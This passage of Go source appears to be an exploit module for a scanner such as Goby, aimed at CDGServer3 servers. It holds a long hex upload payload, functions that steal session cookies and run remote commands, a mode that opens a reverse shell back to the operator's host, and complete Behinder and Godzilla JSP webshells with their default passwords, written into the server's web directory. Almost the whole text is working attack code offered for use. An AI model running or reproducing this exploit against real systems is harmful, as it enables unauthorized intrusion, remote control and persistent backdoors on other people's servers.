1DBB6FFB9C05AE0B5DE324FE537B78E9386011F90473D83D499F2C505D8C3F2A900936843ABB27F3D52191F2BA20C3605A1D6EB4F0999858F28655DD53DBCBD34E3AFFB5B30721A2D2C8CB8B894BFA2A82DB1DBB46FEE64B5AA5B80E069AE1F73EAAE9E83FAA2B87BA3B04F0F2979E1B2573B5D0A4FB70135595C165049D705C1A2146BAD9A6A221F63D31C0CC5071619D6D55B05A2C72BA4EA16AEF9BA3373C639F59891DBFA4851341EBFC0622C181D89BAA703299E52E7176F8FD677A0A7CD80B397258D5F92CA3C085E430F09AC7B00F9059727C1F83C09115693684CF9836F2DFDF45B578B52358AFC6862712C473D484A72F507EA213743964700A27029D1A193A64736E386CC9E916C152B4F3D49192E4D6D34FC77A70D1D6253AF379AC89CBF96D55A234C409BFC6CFAB4D0CBDD9BFFB016DC8E61AD5CC787DD86A1C3E5199B5D71D730B69119122EB9A8754ADC789D97DF5EB333E46D901B9522A08F44EFDE5E7EF9F78255EEE6DA04ED715B9C0E97E001F68B72D28710B1E5EE77AB0ED7ADF3A26750920E9B53915E8DA8943609DC3D3CDD1650470793C739A7E5672D2B924AF609610D1C0054DA6DE5B8767A74CCAFF1A42C2EF0C6FB22AEB6FCACBC880CE01259FB46A64E34420D6DAAAA14F633DC9231914F34AD6EBF9D8B6ECCBFC7BDB9C4A0C84AA5F39580C14E1403B3A352F44C6BF2FB6B86CD9AC8C3536399FD521F8712C42E70371EEAD8998595B559CA2FFC44B611C658D1B0D153F32756D072B3A9D811722D442D011269A367CA925FA8F9DB91E02C28C02DFF1367DC002E7554F0050EFB1993517F1A13DE998520AF153EA50012FDA1C765548C67DE35083D3C3632067832FE845A517CFFA9643451AB9E77232DD94672ECDA4FAC243D529198AD8ACBB9E6BD0442EAC98236EF9E6E4BCF979D880ADB6B670846E112EA54A79CE56F76DEBA9134992BCED75F3B812120DF0451988A95FA7D031D455097108690BF4AFE68DD5AAE05C8945B552C6550785BCB0CE2B7C5F9A110BF2D06CA6B82167E2B979C026FCBCB464AA39D8AFC8B06151F1B3804A4131F8BD5E47AA047B49F85C7F7D25C33B8D49F046E22BA5E808B739AF464E54D679FEEB95365689F68967A3D46097DD1F30C8DF5DC2182772A0ACA8A3FE76BE3B1BA5A2A56224F3BCF29C7EE7D45D551C984BA7E750468A0B796F56754B2241CA321FF9457298336798571BDE9EA091FA69E8AC73CF6083FE9EC3B070FABB0B4733AD6D9D61325E19D56A1A97FAC14A60B238E5C050147CBBF7B41EE6EB411837D138C2C79ED6576AC82D98349D30EF47935D820CBB32DEFABF3F654A6DFC1C088379E2CE0A5901428D41BF82822C41EAAA30884AF7142FB8FE612C63666285F4CC55A24279EE88C2530EE5D1D9F8C110042251E365AC3F4619BB2AFD6DFF19C7E2E87864B21DC8DD83C9DB3FD05600F6291593E2341F9D6DC0CD8FEF5D3489587E7E6BA84F5E0D424831C0AC054C692EE65C8974DC9AFC179AF00D50355678F289289B88DDE91065DA5741B5E451C07178866989822CFB68FA9230A704CC57FA1F361A5A56714508867D139BC9A45F445B68017B545BF2A27504CE70F7A76BA0EA0CE9ED4B79A46B7382BE7BA108F1B5CD392BDBC182216802E2D4864CDAEBA508BBBAF352EAA22623803F3975F1088ACB5BE1C7AB0A718B788B2659B76F87FB36B734805BE52E5DFD45ECFEE1F7C78F7CC27A4AFBC16CDE6B6D9E3D8F06985DFB786634CB8719357E3971F2511B2EC7626500D304B29D05B19593145F13BB29319598BC1710B9C89C123B297AA340435AF145CD70858AFB808871C874CC0414D2F2697A6B7E5455F3A5D9EC7F24412F21A7F9C14DC0C7B2F3489CDF0AC7D0A47242D5FB1770B692456BF313D0D81F4921DA65DAD5440245719BBDDFD0262B9AB72575891072DF318F8CFA96E59148D7F6849912515E0A1FBCE4D0C8710D6ED5F98F41E56F06C29069920F798F4654F43F3233BFBB9ACB8F006DE9FE39CA13C32D8587D7066B8AFECA6B2800E51B46DBDC67E6886C088FB4D872AF04A59646972E81E2ACD9934DD2BC0FE46498356A1C4ED4F2051773C25C843087DE0CCE6DFE4510230764CBE9EB6DDCE193001B82353255EBC7E9A83309A5433C4F8EB9C1F77BBA4EC23F45F619D80477BB6401DD4830FAD47BD914EC84778B4F8E90EFA4B52EB3E3FC3F343086A18DC5E486213498E3EF33614C0EDAF17744EC4FA954752A8B518890DF6B36DE319FAA67E1FD45C74C0963441FEEA5F4FB20966B44490FA927628EA43C86974AAB39771A369244BE07A947665F561F8C13239EA6B8810EB4A18584144DE6C81C83002213C6BF97790F7C965F4CD3CAE172C8BEF72C2BFF867CDBFA04ACA7626CEF436B2EF5370AE0C3A2A1E152D078696C4B79211DFF0F84E64E16B1ACFEC451C63AEF8C5CFD16722AF1663874D1E487112FBA925F415A3EBBC79E74D0C0C58C895BFBB8490BE0A418F984EFA6A8985E8529F5DE751D2C6C814122453D6F554397C5B9CA962D624378BDDA9694C2F8C19B17A50D4A0E06B01AA3896B65FC8CAC09ADBD432C76764B506B685549373D982442F0C43EA8EAAA8822ACA6C95B3F78B5ACA9B14BBC0AB65951D146515E0850ED3C4B7F671A970450AE4998C56458762719BFC1C50B6D5D9EFF404A371F27BB2BD2B1A6B15A3B4C5A3499BD4576B9AA812CB1DB56656F6C9B22905DDCEB2F387DAFE802107118D3DB100DF301B7A0EB6C6F2C93DE1FCC97031519C3117D3404A73E75CE497EB6F2AD16296DD5F14ECA720E899B76AC7EEBDE96C9FE8C6046FFDD25661136D55C0492D2E5C76861DC02F87407364EE6823220D2D067102DDEC18F5F89559219B183F5FFB753D7E2896EDC21D3476D6D1A4FD0BA4DD0D14199AC01BF881F0FE5E86830221F996EE50AB015918443CE914974E4B0F205C89876AFB67C378C9AF55DFFE5A1DC0EBD9A16D15979D03FF6B7FB3600D4142C5CCD6E235151D0F523024929B0714A26E4C15AC703E168A49328ECEE22F5BBAC42DFDADC520C390279F38275C9549F07EC4E7A3490F162CD5F4C378612AE825114D49CB064B8DE02B53FA63449F9E3F9CD95BF920CCC50815BFB2F8917ABF006064A3097F69661D0706D7440F9EE0A6D05CB644B63AEA2EB48187A9F3565EC34DFCCCE8A06098B3BDB2426C9135CE23482F579C8F510FBDA5F9DA4E633F27DAFC35F3A23B1A56A2ACD16BAA36690896BD08EBCC01A0C740A52A117DCA773B8B99EDE7841413C60CAA88B91B8CCDC9CF835B00AD3E9F65C4F925A42259638AE92DC479894EB7CBD7C8F8017AF484375102E70412874B482777FB73550F9024ADF6A00247983B499CFD1D8C2A0B7494233078AB122230A4A18EAC2F544A9AC0ADF83BDFB20F5D61BC1A4F93F788051EEA5785C651EC3D32270C59A3A558CD97C262EF0191906041AF74D6A7654A9533183F267B379CED25938B729832137BCFD313DB45A3A48B0C873E0EEA5DDF58D080FFEC51497ECB9881292C1731DEA43B8F4919A0ACA11426CC951C1A5137B1484E214A31C44730F0D2C410AD0937D048BEDBFA94372BEA30DEDC477B9187B02081DE28E1EEE77FF40051DBA3E95E64332A529EC29B13F102A1A0EEFE926E863B55602F1880D886EE7DDA233FB087C0D5DC9A405234B4160FB189F7176EDAFE4777A20BD31AF926C6B9F92581AFE8E76A1D37D3435C5101A100BA88F2581780E33C7E009AACF893335329CEFE98BD2AB147B5521D1DBB868B28F917559F0515367E39EE88AF014B1B9247ADBEBB62F5B5D270C1F545C8775276D0C0ED647FE7BAE9FEC03F7587009E6F9FCDE3E868CC40B9313622266E3D7B707D70A02CDB19DAAE2E01AC2FBA4F34E7E99055794D1D6AAC40F839A4AA834A60FFB22E075685AD4FA7040F90910A9DF4401A54EA3AE8D07F2835BE81153A87E9C2C98A599AE26F2857F98DC0E6F9B5B8B6E2511D3E5FC00CE46D7FCF03FB40D3192867DEF21636BF652654EE5164F7C6F1051BCF27AFD422988269B3D909CFACBAF7BBF6C1E22A273647A60CE2A0463B4650627D4052CA5C20E15CB70AAF4C0085CA4C8143FC14451DC15C7638745D74EE825CB48913B3A60377E55355BE5FF9A8C6C973E1070527D6349F1A355CEDC5F1A117AB1D2DE1B32560D6E1837FA6D70D8522BE3BFB5331DAF994CC7CA1C29E6B26399143D15CB55AD35EBF93B757CA604743AFAF1A5C8FF80F96BACEFCC1BB60C080006952C5F25D9B9CBF7F8AB3D3667FE72BBEC2210F68D4E624CA658E7E97CD8E4546E3BB1277F2B6527894F82EF50E5C9F4B5543B47E558A067BC60583AF759B5ECB8C844A87341A8C8B6AA0EF3E7D2CEA2CF78F7C417E98E8DB5C561DC0110B6B19D5B6DA10291F441840446AB5D7BBD8BDEC0D699CAA4846438A3D8EFE71E2B585F466B2BF62486AE4954EEDE56F81F6C17F6198347C15F14289DD9E160CBEA1BDDD2C41010F2183C3425DF1FFD00AC4D147088FB3367D9C7B5C42BB2B4DC4F74F65F7A107DE1C451A3704DDA5B79235AD9CD15374DC66975BCFF0BE99A7138B4BFCCFA2325100F4BA416646DFAA3A9A72E420CFDDF54F5B53B5DBF5CA7E8D53EF418FDC679911BD7956FE0360937FB6166457918C89A34ED8A4DB3342225F92763595B028FBE0C30F1BFEE74ED7558A3892831DF0FD1B2C3D0AE6C8462A025C0D0C211F21A961CD05337308FDDF6B070CEBD860BD3F6B47140961C364A2A98EB1E0B61953786F44B215C9335A8B63C5964AE0C87369AA73C4C8E4AF8609BA3780C0FDED4829DCCA0A107039FC353AFD36703980615B50A35CCBA4FB2D8179E64E3396D7AEDE17B5626A966FA54A42981432E313C263A1C7B2CB929CC04EA040AB7C500EBA03AFB12F97438A369970983D66AA009660E8304D9521CE121839FB227592966F754CC2B93EBC05B807EC6E9F3B516AF79212520F6CF23C59B4C5D8F9F382B6C9A28CB3F47FB3F184F66526ED6A5768268E29BD9813166BC16317BBF070AFCD54F0A9CDA64BA5B4115CBE01E93541C9A1A95CF4D6E4F703211DF89551687EF61F1E3312153DA060465F4ABA6233DE8A11CAA80A238C83ABE71BB84E899B9E3598A1E81BF7BAF35934698AC5F07C53DC9407273623081ACBFD65AA439437884EB05706BD6C895175D4CCDCB1B7E2BB57A0496FB73EABA1B81560663DC7C48342FA5EE69BEA930472F1B51D8BED1C92C67FED7033774A39C8DC29C0D35ABBBC511B92499A09C40BF3A8F1F05923A4CC405B634C3600D15566016A5F82F09E4BD38F8AC71E007D8D82B2F05C0F938615481455C3A74FE7FC9F2B883BE7EC8A99BC9B68F176DC0E8FDAC5BEE3876B3E84FF36711EAE54EDCCFD9059AEE78202FDA60BA0495DCA790272B1F66B341AE6DA28B00E8CCF38CB683AFD5250E62E46765E7ABE16228A57D068D34E50CBD9CEA2AAE36D5DCE4231A2A29AAB4BC3D82F9ACBC1CC4A49DE3A8B0AF3D98FC1FA0642EB9A1EC55F063848A3F7CF09EA89C68C9AE0FB48AA25230AFBC4EF3BFC2884329F211ED8BF25C4854772DA3410CBDF7841DA0034FBA2C3A2AC3C1DF4878ED034FFBE173F902AE7E940544D938C1D17E1271F7206FC5590FCB073375CB35C5F0AECBDFED843DCC296DFAAFEDB7AB9308F8B53DE0FB472FC5803F354F7B92F5AB8B8284A64469FD08CBC85CED18FE22360C17E545FB02623901B0366D4A08DD0919B0E8307959C77C92B26FC9BFEF459916D0A355FF6D61CA41F39C80A79D41365EEDB31433FCF714801ABFAB7BCBC6DD58E003DB7399C16EE709BD20220D17DF95A5EA12D92E6D983D6BAE1DBF8193D3CDEF450A2E55F48563C9B0174F0E6D2232F0EBA8FA2CF7622AB1FC8EB3E375AE7D17B375B0F09B0D108D144FA803C3B39309B39FA42154A5113D4DE8D5C5249FE1C7766FD8F7754252B23C4E6AA05BFC2EB72743DAD6EB2B5E09E37A9CFC17FAF3D63555E98A616EEF02B6667EDF344B9725D570BE156BD7CB8F6290E28D8D349E3E500BE0F5B53B1F0272DED7F276664A0CEA848D07A787C7DCDA27A223EB21C294CD8AF830C41C30A35A594D8EF787391D8EC4EE7FBB9DAFBCC9777CC91C12D7961CCD7B09CB6D538CC464DE90CB35A4CD50062E059C09155E25BB3216EECA9A15951FE2C73F83D1D9FD5C35D2D3D0E7E41197BFB0CA4A9FD901C84130D6F52A0E79884DED7811824EC60654354984A7A09C3FF306C305D79D9F1F44C01659EBA2C9F2985CACBBED9F5D55B91A40D7A71BD108A4398F784B75BB43907C06213613AEA24E12AF0E047D0FB89D427ADF215CAB736981F6FB86B030004C27C899B450D47FBE05895463CDB1FC84EEAE8BAB93429860D491BCFD89666FD135EAA03DCE2F878A0D122BEFBF073A3FBB52CB43A44A517A79D179A4AEF8EEC8F9A9105400E22DB5C73AB4A7503D3C40D473AE00128F25951F0FDD881330F14AFE0D9F3C543B86767752A3BCAFE1E72856D030B2ADA0235BCF497D864BB20BC48B7AC38232B3A992305CC193E37F278A5F69E8C27310F659F7D4878B701357C5DE412279FDF11984C527D2FEBCD625AA801A4DBC457DF68E63B32A58DAAC0827FC7DF7EDE2E402E4B5C151E1659CD65E5E9CC321F0ED71D55835CE8FB12D09C3483C29FD88983A5FB5908E0BC32F9AEB5CE567A63A115375E799A833579F8EC16C1A1141F5501C319DC3B84C4C45D802BA82B0B45198E3DEAD566AA304F5EA6545051B21D5D7A3FE47F7311C13EBDEA345D37EDC5505DD40D2C8245980E0B286B4D934B80937F599DA140981062070A41B333555BC1EA33E7EAB180DB268FF52128C9D5749C91B12418114CCEC4BF0BB4D00108B35D0F406D3C3C6B98FEF8A1264CA2B7041B56E70B03B51F686306779E25A6315F8BE10816DAB46A37A7785E5B4D85E0E04B5AFE3692F384023FA54C41EF372668DE71D6CCC2B03307D9A1677F8A93B95160CBD6FEA12DBC9FC151BB5816462BCB80F259FC5D838B656D30EA81490087ED6D06671D7975EF65FF1014E1E325550A0D0531865D9B0E299AD53DAA3B9306B9FE8ADA68065E825D0ECF50182D9CDF79424FEC5F6989B5E0AAE621D17DB0353BF172D647706EE2AB921E8C7B85ADE235F41DA7B9CA9A2E5DCD3235EFBE757925376CC7932D52E76DA653B1A839A44DEDA8C5FF1F6F62363452DA0A4135D9ECBC98EB4C78FE1DC26B98E4795D7A2B7FA1BCD2B3038F6275251229C6563F4D653484DC26EC0AD637731F5DF2391AD1303A47051574B9F4880764DBE229B9964F929606B4E210F5001720B7653DA77339299CFEB7F56654F26232736DDDC743471B5A365A9FA2FFCB490373AED322DFCD22E116B041F052C682C4E0B6238C327240F9478CEA5F0514F3A2864A4543BA981DB65F6A9FE4E2B0D142C954A3C2E37D698E19DD26D4C7FB2D9B9E7E16F24497C795B792EEA2A94E4AC7F080B722A0BE243EAFECE4572D9BDA31278B9CAF3397D8AA3BB98A7B6A70887F20E305D1083C7EC516663F31CF3765A483B463F227E9B8F68124E5FB0D0651B343D994FC6DEF8A9DFFFF52A13BB176FA43A32795BAB05C0E7B7DBE990E22DE2EAD9F73374655A7BF3342F44A425BDC1148E48E69B076A5C9D537F549158216C046B37E5470830B41C3894B4764329BF9EB467BFC99EBB6A34BB9E2B9A911E2B774723B44D5F31586C9A1C530627FEC19D7BC738E59DBFB15B3B9DD23ADFE588BBCBF81F63E319D843560F52B2070F9EC75839071AE0F5C6D70FCCEF3DC914A809331E31DCA5BE5D81A66125B262C8BE532A058300C7AB5B1391115D2E2D9FB49FAC6F0B8927183ADA7A87A26EBB90A89505D1B0F2F6E872112A9B5672E89539AB38FA72B6CE6A949529A6BBA52FCAD3852B582153BB16BAC587FC62A2D6EE4344CFCD01B318295FC511A7C32308C8E5B8967C21C7CE8D0A67EF105D0AE6455323DB57C9A08C6FCF1CF0640AD589E3AFC4A185A7FFC2285A7E1EED6BAB1D9A8BBD1CDA1939FDA223B69AE61A3EFC6D1700BD174A167DD38135356DE95DFB97AB874B283323EEB05D33A5E5EC3E2BF0FB74E0C6846E10CCD8D5FFB80808C751D042303254AF7620CEEB7F80CAA3175177F2F45CEBEC4E740CD391BD53F5BF45804431E32E4F1F85CD3EA982D857C4C6C50DF387E2AC92E0B62249B8DC2B991723F69CA00F14462F675853FC650777AA575E2CB8330CFAC3CCE63C57055C9C21AE61075D7AEBD08826A9B561EF3B608C8D1C84C1B494C3193EA51873F56AAD7451D8C61B1F04DB9183D721E7290E9A6C2FF85A341A8DF93C8C2D8F1B243D87CCFA20B7DA5C824BE8C6F5049EBBD61BA3C6E564C8DA4B7DB295C08FBF06440134535F7465916C42AFA825C349DA4AFA7761BF75B60788F731326346350DB51006CE46D5FF523327DDFF3C0F6E409BDFFA7D593E507F78233C8480DFF804CDE62895C8EC3631CA68CDC0E143258994A7EF4A4A71F74ED8F97A88494B324B5467420EA3490E148F8D247820A1BFD4B2FD012CC057902D983F1703219EE13CEBD42349593C584EA091B306575E0A92D1505D9AE45602CEF80B548855FE255DBF9BFD92AD59F9F8D983ED42D91EE6FCAAAEA9285A813210F160B57975F97BF94FE5730B91620270C691FC1E6608B7EDF7323A4A1B46221015A0A4922B1636F638B328C224EF035BC288F2E34E5190BAA1ADC69602DA0728354953BC241A6FD25B414F136F6C7F78270BFE80EBFA01A7B65E0AF95245E0BBB3B2ACAEFC6AB0383108989AF2EB0C94FCF8057BF3966FE24A1AE449689CC4F5B920E4FFF30EAACAEE4AE2DB787CF3B226DBFAAE8D106AA1206F4E7C284404CAEB5E01C663E0C32C484269F59210ECF2B43255E9FE5439EEE39EC88BE38479D9969D9779831977A92CA91376A2E32572EF8353EAC7B0440C7B8C4C98CBC706E270831EFB21B2507317A869EAC78998E65DD9B7E188FA58F14C72D2FB87AD2DBBD67E8FBA80D26CC1EEC11E468B5D606559F56582A09A026306CB811E47CF8ACAE0C98F43B3B8D548BB7B79FEB49ED21673B0C830FB66AC8FEB4D988A2E45884A49C87E12C4EE9BEF4209B7C647099823BB719A85268D4EA0842A54354A1F3F35E18BB929B997C84736507202ED06CDB5A2388AB5BEFBD3C565E29FA107426A1D6784ADCC15CF521ED1D7D0B910A8BDDC6675E227F17E7B792E09487D920866E87F8A06E0D94E8E2A104C10AA99C38A04D42512D607895F6839E9A7475AC5AAE6F61D43042E3D81903BC642EC434D2E2C48E061CDFC2437B2EEBA6BA4FAF2FBD8E1A32890A8EC1AB49819CE1C94F9C2E1701D71A77B694AB3194DE02823EC170FEDAF075D7132ED52565F57631297FAEFFB569809B777456EC8063F3FE448D240F03CD5C7AF5B00F25A6C1F83FDAB917FB1E97DF41A0C81E1D774E87CAE6049E61AA818ABD666F10A245D175B0F43F4A0A3252F4409CFA9F6E7665BA284CF6E71A2CC3E3A3536DBE0B18E51DB3BDA035E69231941650DC7314C6E76BD686BA97D2EE33199B9E3AFF45249A1C98775E035375B151C1804C1D30F2121C107F4ADA68D8A0DADC736EA1576B8275C02C7F10D7FC0FA9441022B4591BD86B1CA0B8F1AF5AF4A5CCAEFCA2AE406D8CB57DCC7CB8AC050E0EEE3886C90C51E70AACED88D79DDC86EEAA0AA3DF59B3084DF9A4E4CB8321F3F914F60896B0B25CD668174A58A430CFDD55B3D6B5710332224B3D12E7F0BB32A9134407D855CC0081B9")
		postRequestConfig.Data = "--------------------------26befc614f585c9c\r\nContent-Disposition: form-data; name=\"dlpPolicyFile\"; filename=\"CC6.file\"\r\nContent-Type: application/octet-stream\r\n\r\n" + string(fileContent) + "\r\n--------------------------26befc614f585c9c--\r\n"
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	verifyFileExistsCPOAIUEJDOI := func(hostInfo *httpclient.FixUrl, cookie, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/CDGServer3/" + filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		getRequestConfig.Header.Store("Cookie", cookie)
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			cookie, _ := getCookieCSPOAJEKDIPOW(hostInfo)
			return len(cookie) > 0
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			webshell := stepLogs.Params["webshell"].(string)
			cookie, err := getCookieCSPOAJEKDIPOW(expResult.HostInfo)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			} else if len(cookie) < 1 {
				expResult.Output = "Cookie获取失败！"
				return expResult
			}
			if attackType == "login" {
				expResult.Success = true
				expResult.Output = fmt.Sprintf("Cookie: %s", cookie)
			} else if attackType == "cmd" {
				cmd := stepLogs.Params["cmd"].(string)
				resp, err := executeCommandDMJOIUWHUEDAISDNOJIAh(expResult.HostInfo, cookie, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd := fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				_, err = executeCommandDMJOIUWHUEDAISDNOJIAh(expResult.HostInfo, cookie, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = stepLogs.Params["content"].(string)
					filename = goutils.B2S(stepLogs.Params["filename"])
				}
				_, err := executeCommandDMJOIUWHUEDAISDNOJIAh(expResult.HostInfo, cookie, fmt.Sprintf("$$$$$./../webapps/CDGServer3/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content))))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				resp, err := verifyFileExistsCPOAIUEJDOI(expResult.HostInfo, cookie, filename)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp\n"
					expResult.Output += "Cookie: " + cookie
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
